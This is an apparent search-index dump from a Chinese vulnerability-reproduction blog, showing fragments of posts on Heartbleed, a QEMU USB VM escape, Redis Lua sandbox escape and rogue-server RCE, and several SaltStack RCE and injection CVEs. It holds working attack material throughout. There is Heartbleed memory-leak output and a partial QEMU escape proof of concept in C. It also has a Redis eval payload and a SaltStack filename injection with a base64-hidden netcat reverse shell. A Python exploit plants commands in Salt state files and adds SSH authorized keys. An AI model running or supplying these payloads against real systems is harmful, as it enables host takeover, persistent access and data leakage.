192.168.51.133:443 - Length: 818 [*] 192.168.51.133:443 - Type: Certificate Data (11) [*] 192.168.51.133:443 - Certificates length: 815 [*] 192.168.51.133:443 - Data length: 818 [*] 192.168.51.133:443 - Certificate #1: [*] 192.168.51.133:443 - Certificate #1: Length: 812 [*] 192.168.51.133:443 - Certificate #1: #\u003cOpenSSL::X509::Certificate: subject=#\u003cOpenSSL::X509::Name CN=localhost,O=Dis,L=Springfield,ST=Denial,C=US\u003e, issuer=#\u003cOpenSSL::X509::Name CN=localhost,O=Dis,L=Springfield,ST=Denial,C=US\u003e, serial=#\u003cOpenSSL::BN:0x00007efe8154c028\u003e, not_before=2020-08-09 17:03:46 UTC, not_after=2021-08-09 17:03:46 UTC\u003e [*] 192.168.51.133:443 - SSL record #3: [*] 192.168.51.133:443 - Type: 22 [*] 192.168.51.133:443 - Version: 0x0301 [*] 192.168.51.133:443 - Length: 331 [*] 192.168.51.133:443 - Handshake #1: [*] 192.168.51.133:443 - Length: 327 [*] 192.168.51.133:443 - Type: Server Key Exchange (12) [*] 192.168.51.133:443 - SSL record #4: [*] 192.168.51.133:443 - Type: 22 [*] 192.168.51.133:443 - Version: 0x0301 [*] 192.168.51.133:443 - Length: 4 [*] 192.168.51.133:443 - Handshake #1: [*] 192.168.51.133:443 - Length: 0 [*] 192.168.51.133:443 - Type: Server Hello Done (14) [*] 192.168.51.133:443 - Sending Heartbeat... [*] 192.168.51.133:443 - Heartbeat response, 65535 bytes [+] 192.168.51.133:443 - Heartbeat response with leak, 65535 bytes [*] 192.168.51.133:443 - Printable info leaked: ......_...DV.\\....G...{.vc..i ..Gv.'....f.....\".!.9.8.........5.............................3.2.....E.D...../...A.......................................w.....#.'.g.@.r.v.........8.........2.....E.D.......Q.......P.=...\u003c.......A...............................#.............*.(.........................................+........-.....3.\u0026.$... 3.\u003c.]...et1.....","date":"0001-01-01","objectID":"/openssl-%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E-cve-2014-0160/:4:0","tags":null,"title":"","uri":"/openssl-%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E-cve-2014-0160/"},{"categories":null,"content":"QEMU 虚拟机逃逸漏洞 CVE-2020-14364 ","date":"0001-01-01","objectID":"/qemu-%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E-cve-2020-14364/:0:0","tags":null,"title":"","uri":"/qemu-%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E-cve-2020-14364/"},{"categories":null,"content":"漏洞描述 当地时间8月24日，一个存在于QEMU USB模拟器中的越界读写漏洞（CVE-2020-14364）被公布。 漏洞位于 ./hw/usb/core.c 中，当程序处理来自客户机的USB数据包时，如果在 do_token_in 与 do_token_out中’USBDevice-\u003esetup_len’超过了USBDevice-\u003edata_buf[4096]，则存在问题。 客户机用户可能会使用此漏洞使QEMU进程崩溃，从而导致DoS或在宿主机上以QEMU进程的特权执行任意代码，实现虚拟机逃逸。 攻击者在拥有云环境虚拟机操作系统权限的情况下，便可利用该漏洞获取宿主机权限，进而攻击虚拟机所在资源池所有租户主机，甚至可通过已开通的内网权限攻击管理域系统，风险极高。 本次漏洞的影响范围较广，涉及qemu 1.0 以上的全部版本。 ","date":"0001-01-01","objectID":"/qemu-%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E-cve-2020-14364/:1:0","tags":null,"title":"","uri":"/qemu-%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E-cve-2020-14364/"},{"categories":null,"content":"漏洞影响 Qemu \u003e 1.0 ","date":"0001-01-01","objectID":"/qemu-%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E-cve-2020-14364/:2:0","tags":null,"title":"","uri":"/qemu-%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E-cve-2020-14364/"},{"categories":null,"content":"漏洞复现 USB总线通过创建一个USBpacket对象来和USB设备通信。 Usbpacket对象中包含以下关键内容 其中pid表明packet的类型，存在三种类型in、out、setup, ep指向endpoint对象，通过此结构定位目标usb设备。 数据交换为usbdevice中缓冲区的data_buf与usbpacket对象中使用usb_packet_map申请的缓冲区两者间通过usb_packet_copy函数实现,为了防止两者缓冲区长度不匹配，传送的长度由s-\u003esetup_len限制。 漏洞存在于s-\u003esetup_len赋值的过程do_token_setup中。 虽然进行了校验，但是由于在校验前，s-\u003esetup_len的值已经被设置导致之后的do_token_in或者do_token_out中使用usb_packet_copy时会产生越界读写漏洞。 泄露USBdevice对象的地址。观察越界可读内容发现 可以从下方的ep_ctl-\u003edev获取到usbdevice的对象地址。 通过usbdevice的对象地址我们可以得到s-\u003edata_buf的位置，之后只需要覆盖下方的setup_index为目标地址-(s-\u003edata_buf)即可实现任意地址写。 我们还需要获取任何地址读取功能，setup_buf [0]控制写入方向，并且只能由do_token_setup进行修改。 由于我们在第二步中使用了越界写入功能，因此setup_buf [0]是写入方向，因此只可以进行写入操作，无法读取。绕过方法：设置setup_index = 0xfffffff8，再次越界，修改setup_buf [0]的值，然后再次将setup_index修改为要读取的地址，以实现任意地址读取。 通过任意地址读取usbdevice对象的内容以获取ehcistate对象地址，再次使用任意地址读取ehcistate对象的内容以获取ehci_bus_ops_companion地址。 该地址位于程序data节区。 这时，我们可以获得程序的加载地址和system @ plt地址。也可以通过读取usbdevice固定偏移位置后的usb-tablet对象来获得加载地址。 在data_buf中伪造irq结构。 以伪造结构劫持ehcistate中的irq对象。 通过mmio读取寄存器以触发ehci_update_irq，执行system（“ xcalc”）。 完成利用 QEMU CVE-2020-14364 POC 视频演示 ","date":"0001-01-01","objectID":"/qemu-%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E-cve-2020-14364/:3:0","tags":null,"title":"","uri":"/qemu-%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E-cve-2020-14364/"},{"categories":null,"content":"漏洞POC #include \u003cassert.h\u003e #include \u003cfcntl.h\u003e #include \u003cinttypes.h\u003e #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e #include \u003csys/mman.h\u003e #include \u003csys/types.h\u003e #include \u003cunistd.h\u003e #include \u003csys/io.h\u003e #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e #include \u003cerrno.h\u003e #include \u003csys/types.h\u003e #include \u003csys/socket.h\u003e #include \u003cstdbool.h\u003e #include \u003cnetinet/in.h\u003e unsigned char* mmio_mem; char *dmabuf; struct ohci_hcca * hcca; struct EHCIqtd * qtd; struct ohci_ed * ed; struct ohci_td * td; char *setup_buf; uint32_t *dmabuf32; char *td_addr; struct EHCIqh * qh; struct ohci_td * td_1; char *dmabuf_phys_addr; typedef struct USBDevice USBDevice; typedef struct USBEndpoint USBEndpoint; struct USBEndpoint { uint8_t nr; uint8_t pid; uint8_t type; uint8_t ifnum; int max_packet_size; int max_streams; bool pipeline; bool halted; USBDevice *dev; USBEndpoint *fd; USBEndpoint *bk; }; struct USBDevice { int32_t remote_wakeup; int32_t setup_state; int32_t setup_len; int32_t setup_index; USBEndpoint ep_ctl; USBEndpoint ep_in[15]; USBEndpoint ep_out[15]; }; typedef struct EHCIqh { uint32_t next; /* Standard next link pointer */ /* endpoint characteristics */ uint32_t epchar; /* endpoint capabilities */ uint32_t epcap; uint32_t current_qtd; /* Standard next link pointer */ uint32_t next_qtd; /* Standard next link pointer */ uint32_t altnext_qtd; uint32_t token; /* Same as QTD token */ uint32_t bufptr[5]; /* Standard buffer pointer */ } EHCIqh; typedef struct EHCIqtd { uint32_t next; /* Standard next link pointer */ uint32_t altnext; /* Standard next link pointer */ uint32_t token; uint32_t bufptr[5]; /* Standard buffer pointer */ } EHCIqtd; uint64_t virt2phys(void* p) { uint64_t virt = (uint64_t)p; // Assert page alignment int fd = open(\"/proc/self/pagemap\", O_RDONLY); if (fd == -1) die(\"open\"); uint64_t offset = (virt / 0x1000) * 8; lseek(fd, offset, SEEK_SET); uint64_t phys; if (read(fd, \u0026phys, 8 ) != 8) die(\"read\"); // Assert page present phys = (phys \u0026 ((1ULL \u003c\u003c 54) - 1)) * 0x1000+(virt\u00260xfff); return phys; } void die(const char* msg) { perror(msg); exit(-1); } void mmio_write(uint32_t addr, uint32_t value) { *((uint32_t*)(mmio_mem + addr)) = value; } uint64_t mmio_read(uint32_t addr) { return *((uint64_t*)(mmio_mem + addr)); } void init(){ int mmio_fd = open(\"/sys/devices/pci0000:00/0000:00:05.7/resource0\", O_RDWR | O_SYNC); if (mmio_fd == -1) die(\"mmio_fd open failed\"); mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0); if (mmio_mem == MAP_FAILED) die(\"mmap mmio_mem failed\"); dmabuf = mmap(0, 0x3000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0); if (dmabuf == MAP_FAILED) die(\"mmap\"); mlock(dmabuf, 0x3000); hcca=dmabuf; dmabuf32=dmabuf+4; qtd=dmabuf+0x200; qh=dmabuf+0x100; setup_buf=dmabuf+0x300; } void init_state(){ mmio_write(0x64,0x100); mmio_write(0x64,0x4); qh-\u003eepchar=0x00; qh-\u003etoken=1\u003c\u003c7; qh-\u003ecurrent_qtd=virt2phys(dmabuf+0x200); struct EHCIqtd * qtd; qtd=dmabuf+0x200; qtd-\u003etoken=1\u003c\u003c7 | 2\u003c\u003c8 | 8\u003c\u003c16; qtd-\u003ebufptr[0]=virt2phys(dmabuf+0x300); setup_buf[6]=0xff; setup_buf[7]=0x0; dmabuf32[0]=virt2phys(dmabuf+0x100)+0x2; mmio_write(0x28,0x0); mmio_write(0x30,0x0); mmio_write(0x38,virt2phys(dmabuf)); mmio_write(0x34,virt2phys(dmabuf)); mmio_write(0x20,0x11); } void set_length(uint16_t len,uint8_t in){ mmio_write(0x64,0x100); mmio_write(0x64,0x4); setup_buf[0]=in; setup_buf[6]=len\u00260xff; setup_buf[7]=(len\u003e\u003e8)\u00260xff; qh-\u003eepchar=0x00; qh-\u003etoken=1\u003c\u003c7; qh-\u003ecurrent_qtd=virt2phys(dmabuf+0x200); qtd-\u003etoken=1\u003c\u003c7 | 2\u003c\u003c8 | 8\u003c\u003c16; qtd-\u003ebufptr[0]=virt2phys(dmabuf+0x300); dmabuf32[0]=virt2phys(dmabuf+0x100)+0x2; mmio_write(0x28,0x0); mmio_write(0x30,0x0); mmio_write(0x38,virt2phys(dmabuf)); mmio_write(0x34,virt2phys(dmabuf)); mmio_write(0x20,0x11); } void do_copy_read(){ mmio_write(0x64,0x100); mmio_write(0x64,0x4); qh-\u003eepchar=0x00; qh-\u003etoken=1\u003c\u003c7; qh-\u003ecurrent_qtd=virt2phys(dmabuf+0x200); qtd-\u003etoken=1\u003c\u003c7 | 1\u003c\u003c8 | 0x1f00\u003c\u003c16; qtd-\u003ebufptr[0]=virt2phys(dmabuf+0x1000); qtd-\u003ebufptr[1]=virt2phys(dmabuf+0x2000)","date":"0001-01-01","objectID":"/qemu-%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E-cve-2020-14364/:4:0","tags":null,"title":"","uri":"/qemu-%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E-cve-2020-14364/"},{"categories":null,"content":"Redis Lua 沙箱绕过 远程命令执行 CVE-2022-0543 ","date":"0001-01-01","objectID":"/redis-lua-%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2022-0543/:0:0","tags":null,"title":"","uri":"/redis-lua-%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2022-0543/"},{"categories":null,"content":"漏洞描述 Redis是著名的开源Key-Value数据库，其具备在沙箱中执行Lua脚本的能力。 Debian以及Ubuntu发行版的源在打包Redis时，在Lua沙箱中遗留了一个对象package，攻击者可以利用这个对象提供的方法加载动态链接库liblua里的函数，进而逃逸沙箱执行任意命令。 ","date":"0001-01-01","objectID":"/redis-lua-%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2022-0543/:1:0","tags":null,"title":"","uri":"/redis-lua-%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2022-0543/"},{"categories":null,"content":"漏洞影响 只限于Debian和Debian派生的Linux发行版（如Ubuntu）上的Redis服务 ","date":"0001-01-01","objectID":"/redis-lua-%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2022-0543/:2:0","tags":null,"title":"","uri":"/redis-lua-%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2022-0543/"},{"categories":null,"content":"漏洞复现 远程连接Redis, 执行POC eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"whoami\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0 ","date":"0001-01-01","objectID":"/redis-lua-%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2022-0543/:3:0","tags":null,"title":"","uri":"/redis-lua-%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2022-0543/"},{"categories":null,"content":"Redis 小于5.0.5 主从复制 RCE ","date":"0001-01-01","objectID":"/redis-%E5%B0%8F%E4%BA%8E5.0.5-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6-rce/:0:0","tags":null,"title":"","uri":"/redis-%E5%B0%8F%E4%BA%8E5.0.5-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6-rce/"},{"categories":null,"content":"漏洞描述 在2019年7月7日结束的WCTF2019 Final上，LC/BC的成员Pavel Toporkov在分享会上介绍了一种关于redis新版本的RCE利用方式，比起以前的利用方式来说，这种利用方式更为通用，危害也更大 Pavel Toporkov的分享 ","date":"0001-01-01","objectID":"/redis-%E5%B0%8F%E4%BA%8E5.0.5-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6-rce/:1:0","tags":null,"title":"","uri":"/redis-%E5%B0%8F%E4%BA%8E5.0.5-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6-rce/"},{"categories":null,"content":"漏洞影响 Redis \u003c= 5.0.5 ","date":"0001-01-01","objectID":"/redis-%E5%B0%8F%E4%BA%8E5.0.5-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6-rce/:2:0","tags":null,"title":"","uri":"/redis-%E5%B0%8F%E4%BA%8E5.0.5-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6-rce/"},{"categories":null,"content":"环境搭建 docker pull damonevking/redis5.0 docker run -p 6379:6379 -d damonevking/redis5.0 redis-server nmap扫描一下6379端口开放即为搭建成功 root@kali:~/桌面# docker pull damonevking/redis5.0 Using default tag: latest latest: Pulling from damonevking/redis5.0 fc7181108d40: Pull complete 3e0ac67cad82: Pull complete 6ee495cb7235: Pull complete 9f7206d08b9d: Pull complete a8354ef8cccb: Pull complete 53afb10d81c2: Pull complete Digest: sha256:adcf62f378efe1187d2f72c6f0ecdf86ab2173a9e1c3c9f4fe4bb89060f5362f Status: Downloaded newer image for damonevking/redis5.0:latest docker.io/damonevking/redis5.0:latest root@kali:~/桌面# docker run -p 6379:6379 -d damonevking/redis5.0 redis-server 1275aa9c6c8f8ad0b6c8e58e609be6681acedec301b5593f7e8b0bd65f7fad12 root@kali:~/桌面# nmap 127.0.0.1 -p 6379 Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-08 21:47 CST Nmap scan report for localhost (127.0.0.1) Host is up (0.000099s latency). PORT STATE SERVICE 6379/tcp open redis Nmap done: 1 IP address (1 host up) scanned in 0.10 seconds ","date":"0001-01-01","objectID":"/redis-%E5%B0%8F%E4%BA%8E5.0.5-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6-rce/:3:0","tags":null,"title":"","uri":"/redis-%E5%B0%8F%E4%BA%8E5.0.5-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6-rce/"},{"categories":null,"content":"漏洞复现 关于漏洞原理请查看Pavel Toporkov的分享 漏洞利用脚本: n0b0dyCN/redis-rogue-server ➜ ./redis-rogue-server.py -h ______ _ _ ______ _____ | ___ \\ | (_) | ___ \\ / ___| | |_/ /___ __| |_ ___ | |_/ /___ __ _ _ _ ___ \\ `--. ___ _ ____ _____ _ __ | // _ \\/ _` | / __| | // _ \\ / _` | | | |/ _ \\ `--. \\/ _ \\ '__\\ \\ / / _ \\ '__| | |\\ \\ __/ (_| | \\__ \\ | |\\ \\ (_) | (_| | |_| | __/ /\\__/ / __/ | \\ V / __/ | \\_| \\_\\___|\\__,_|_|___/ \\_| \\_\\___/ \\__, |\\__,_|\\___| \\____/ \\___|_| \\_/ \\___|_| __/ | |___/ @copyright n0b0dy @ r3kapig Usage: redis-rogue-server.py [options] Options: -h, --help show this help message and exit --rhost=REMOTE_HOST target host --rport=REMOTE_PORT target redis port, default 6379 --lhost=LOCAL_HOST rogue server ip --lport=LOCAL_PORT rogue server listen port, default 21000 --exp=EXP_FILE Redis Module to load, default exp.so -v, --verbose Show full data stream Example python3 redis-rogue-server.py --rhost 192.168.51.146 --lhost 192.168.51.146 --exp=exp.so ","date":"0001-01-01","objectID":"/redis-%E5%B0%8F%E4%BA%8E5.0.5-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6-rce/:4:0","tags":null,"title":"","uri":"/redis-%E5%B0%8F%E4%BA%8E5.0.5-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6-rce/"},{"categories":null,"content":"SaltStack Minion 命令注入漏洞 CVE-2021-31607 ","date":"0001-01-01","objectID":"/saltstack-minion-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2021-31607/:0:0","tags":null,"title":"","uri":"/saltstack-minion-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2021-31607/"},{"categories":null,"content":"漏洞描述 2021年4月28日，深信服安全团队监测到一则Salt组件存在 SaltStack Minion 命令注入漏洞的信息，漏洞编号：CVE-2021-31607，漏洞威胁等级：中危。 该漏洞是由于在SaltStack Salt 2016.9至3002.6中，快照程序模块中存在一个命令注入漏洞，攻击者可利用该漏洞获得权限的情况下，对一个分支系统的本地特权进行升级。 参考阅读： https://sec.stealthcopter.com/saltstack-snapper-minion-privledge-escaltion/ https://nvd.nist.gov/vuln/detail/CVE-2021-31607 https://nox.qianxin.com/vulnerability/detail/97347 ","date":"0001-01-01","objectID":"/saltstack-minion-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2021-31607/:1:0","tags":null,"title":"","uri":"/saltstack-minion-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2021-31607/"},{"categories":null,"content":"漏洞影响 2016.9 ≤ SaltStack Salt ≤ 3002.6 ","date":"0001-01-01","objectID":"/saltstack-minion-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2021-31607/:2:0","tags":null,"title":"","uri":"/saltstack-minion-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2021-31607/"},{"categories":null,"content":"漏洞复现 利用条件 : 用户认证：需要用户认证 前置条件：配置了快照程序，使用snapper模块 触发方式：本地 poc： echo hi \u003e '$(touch HACKED).txt' 反弹shell： echo hi \u003e '$(echo bmMgLWUgL2Jpbi9iYXNoIDEyNy4wLjAuMSA0NDQ0|base64 -d|sh -i).txt' ","date":"0001-01-01","objectID":"/saltstack-minion-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2021-31607/:3:0","tags":null,"title":"","uri":"/saltstack-minion-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2021-31607/"},{"categories":null,"content":"Saltstack 未授权RCE漏洞 CVE-2021-25281~25283 ","date":"0001-01-01","objectID":"/saltstack-%E6%9C%AA%E6%8E%88%E6%9D%83rce%E6%BC%8F%E6%B4%9E-cve-2021-25281~25283/:0:0","tags":null,"title":"","uri":"/saltstack-%E6%9C%AA%E6%8E%88%E6%9D%83rce%E6%BC%8F%E6%B4%9E-cve-2021-25281~25283/"},{"categories":null,"content":"漏洞描述 SaltStack套件是政企机构 IT运维管理人员常用的管理工具，利用这些漏洞，最严重情形可导致未授权远程代码执行。 CVE-2021-25281：salt-api wheel_async未授权访问 CVE-2021-25283：sdb rest插件模版渲染问题 CVE-2021-25282：wheel/pillar_roots.py文件任意写漏洞 ( 参考链接： https://mp.weixin.qq.com/s/iu4cS_DZTs0sVVg92RBe4Q https://mp.weixin.qq.com/s/QvQoTuQJVthxS07pbLWJmg https://saltproject.io/security_announcements/active-saltstack-cve-release-2021-feb-25/ https://dozer.nz/posts/saltapi-vulns https://github.com/Immersive-Labs-Sec/CVE-2021-25281 ","date":"0001-01-01","objectID":"/saltstack-%E6%9C%AA%E6%8E%88%E6%9D%83rce%E6%BC%8F%E6%B4%9E-cve-2021-25281~25283/:1:0","tags":null,"title":"","uri":"/saltstack-%E6%9C%AA%E6%8E%88%E6%9D%83rce%E6%BC%8F%E6%B4%9E-cve-2021-25281~25283/"},{"categories":null,"content":"漏洞影响 Saltstack 3002.2之前的所有版本 SaltStack =\u003c 3002.2 SaltStack =\u003c 3001.4 SaltStack =\u003c 3000.6 ","date":"0001-01-01","objectID":"/saltstack-%E6%9C%AA%E6%8E%88%E6%9D%83rce%E6%BC%8F%E6%B4%9E-cve-2021-25281~25283/:2:0","tags":null,"title":"","uri":"/saltstack-%E6%9C%AA%E6%8E%88%E6%9D%83rce%E6%BC%8F%E6%B4%9E-cve-2021-25281~25283/"},{"categories":null,"content":"网络测绘 app=\"SALTSTACK-产品\" ","date":"0001-01-01","objectID":"/saltstack-%E6%9C%AA%E6%8E%88%E6%9D%83rce%E6%BC%8F%E6%B4%9E-cve-2021-25281~25283/:3:0","tags":null,"title":"","uri":"/saltstack-%E6%9C%AA%E6%8E%88%E6%9D%83rce%E6%BC%8F%E6%B4%9E-cve-2021-25281~25283/"},{"categories":null,"content":"漏洞复现 CVE-2021-25281 + CVE-2021-25282 poc： http://target/run POST: \"client\": \"wheel_async\", \"fun\": \"pillar_roots.write\", \"data\": \"../../../../../tmp/test2\", \"path\": \"../../../../../tmp/test2\", \"username\": \"password\", \"password\": \"username\", \"eauth\": \"pam\" CVE-2021-25281.py： # Copyright (C) 2021 Alex Seymour, Immersive Labs # https://github.com/Immersive-Labs-Sec/CVE-2021-25281 # # Permission is hereby granted, free of charge, to any person obtaining a copy # of this software and associated documentation files (the \"Software\"), to deal # in the Software without restriction, including without limitation the rights # to use, copy, modify, merge, publish, distribute, sublicense, and/or sell # copies of the Software, and to permit persons to whom the Software is # furnished to do so, subject to the following conditions: # The above copyright notice and this permission notice shall be included in all # copies or substantial portions of the Software. # THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR # IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, # FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE # AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER # LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE # SOFTWARE. from argparse import ArgumentParser, Namespace from pathlib import Path from secrets import token_hex from textwrap import dedent import requests import urllib3 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) def read_file(file_path: Path): try: with file_path.open() as handle: return handle.read() except OSError: print(f'[-] Cannot read file {file_path}') exit(1) def send_request(url: str, path: str, data: str): path = path[1:] if path.startswith('/') else path url = f'https://{url}/run' if not url.startswith(('http', 'https')) else f'{url}/run' try: response = requests.post( url, verify=False, json={ 'eauth': 'auto', 'client': 'wheel_async', 'fun': 'pillar_roots.write', 'data': data, 'path': f'../../../../../../{path}', }, ) except requests.RequestException: print(f'[-] Failed to send request to {url}') exit(1) if json := response.json(): print(f'[+] Got JID: {json[\"return\"][0][\"jid\"]}, the job was queued successfully') else: print('[-] No JID was returned, the request may have failed or the target is not vulnerable') def handle_write_file(args: Namespace): if args.file: file_contents = read_file(args.file) elif args.data: file_contents = args.data else: print('[-] Either file or data is required') exit(1) print('[+] Attempting to write file') send_request(args.target, args.path, file_contents) def handle_state_file(args: Namespace): state_file_path = Path('/srv') / 'salt' / f'{token_hex(16)}.sls' file_contents = dedent(f\"\"\"\\ '{args.cmd}': cmd.run \"\"\") print(f'[+] Attempting to write command to {state_file_path} state file') send_request(args.target, f'/srv/salt/{state_file_path.name}', file_contents) def handle_ssh_key(args: Namespace): public_key = read_file(args.public_key) print(f'[+] Attempting to write an authorized key for user {args.user}') if args.user == 'root': send_request(args.target, '/root/.ssh/authorized_keys', public_key) else: send_request(args.target, f'/home/{args.user}/.ssh/authorized_keys', public_key) def main(): parser = ArgumentParser() parser.add_argument('target', help='The URL of the target Salt master') subparsers = parser.add_subparsers() write_parser = subparsers.add_parser('write', help='Write data to a file on the master') write_parser.add_argument('path', help='The file path to write to on the target') write_parser.add_argument('-f', '--file', type=Path, help='A file to upload to the target') write_parser.add_argument('-d', '--data', help='The raw contents to write to a file') write_parser.set_defaults(func=handle_write_file) state_parser = subparsers.add_parser('stat","date":"0001-01-01","objectID":"/saltstack-%E6%9C%AA%E6%8E%88%E6%9D%83rce%E6%BC%8F%E6%B4%9E-cve-2021-25281~25283/:4:0","tags":null,"title":"","uri":"/saltstack-%E6%9C%AA%E6%8E%88%E6%9D%83rce%E6%BC%8F%E6%B4%9E-cve-2021-25281~25283/"},{"categories":null,"content":"SaltStack 未授权访问命令执行漏洞 CVE-2020-16846 25592 ","date":"0001-01-01","objectID":"/saltstack-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-16846-25592/:0:0","tags":null,"title":"","uri":"/saltstack-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-16846-25592/"},{"categories":null,"content":"漏洞描述 2020年11月4日，SaltStack 官方发布了一则安全更新公告，其中CVE-2020-16846和CVE-2020-25592组合使用可在未授权的情况下通过salt-api接口执行任意命令。CVE-2020-25592允许任意用户调用SSH模块，CVE-2020-16846允许用户执行任意命令。salt-api虽不是默认开启配置，但绝大多数SaltStack用户会选择开启salt-api，故存在较高风险。 ","date":"0001-01-01","objectID":"/saltstack-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-16846-25592/:1:0","tags":null,"title":"","uri":"/saltstack-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-16846-25592/"},{"categories":null,"content":"漏洞影响 SaltStack Version 3002 SaltStack Version 3001.1, 3001.2 SaltStack Version 3000.3, 3000.4 SaltStack Version 2019.2.5, 2019.2.6 SaltStack Version 2018.3.5 SaltStack Version 2017.7.4, 2017.7.8 SaltStack Version 2016.11.3, 2016.11.6,2016.11.10 SaltStack Version 2016.3.4, 2016.3.6,2016.3.8 SaltStack Version 2015.8.10, 2015.8.13 